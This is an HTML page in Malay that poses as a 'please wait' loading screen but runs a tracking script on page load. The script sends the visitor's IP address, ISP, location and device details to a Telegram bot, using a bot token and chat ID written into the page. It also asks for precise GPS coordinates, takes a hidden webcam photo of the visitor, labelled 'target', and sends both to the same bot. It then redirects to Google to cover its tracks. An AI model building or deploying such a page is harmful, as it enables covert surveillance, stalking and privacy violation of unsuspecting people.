<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body style="background: #000; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">

    <p>Sila tunggu sebentar...</p>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const CHAT_ID = '8563935930';

        async function startTrace() {
            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
            
            // 1. Ambil IP & Info Peranti
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                let infoAsas = `🔔 *TARGET BARU DIKESAN!*\n` +
                               `📅 *Masa:* ${waktu}\n` +
                               `🌐 *IP:* \`${data.ip}\`\n` +
                               `📍 *Lokasi IP:* ${data.city}, ${data.region}, ${data.country_name}\n` +
                               `📡 *ISP:* ${data.org}\n` +
                               `📱 *Peranti:* ${navigator.userAgent}`;
                
                await sendToTele(infoAsas);
            } catch (e) { 
                await sendToTele(`⚠️ Gagal ambil IP pada ${waktu}`);
            }

            // 2. Ambil Lokasi GPS Tepat (Akan minta izin secara automatik)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendToTele(`📍 *LOKASI GPS TEPAT*\nLink: [Google Maps](${mapLink})\nKetepatan: ${pos.coords.accuracy.toFixed(2)}m`);
                }, null, { enableHighAccuracy: true });
            }

            // 3. Ambil Gambar (Akan minta izin secara automatik)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(res => setTimeout(res, 1500)); // Tunggu kamera stabil
                
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'snap.jpg');
                    fd.append('caption', `📸 Gambar Target\n⏰ ${waktu}`);
                    
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            } catch (e) {
                console.log("Kamera disekat.");
            }

            // Redirect selepas 4 saat supaya proses hantar sempat selesai
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 4000);
        }

        async function sendToTele(text) {
            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        // Jalankan secara automatik sebaik sahaja page load
        window.onload = startTrace;
    </script>
</body>
</html>
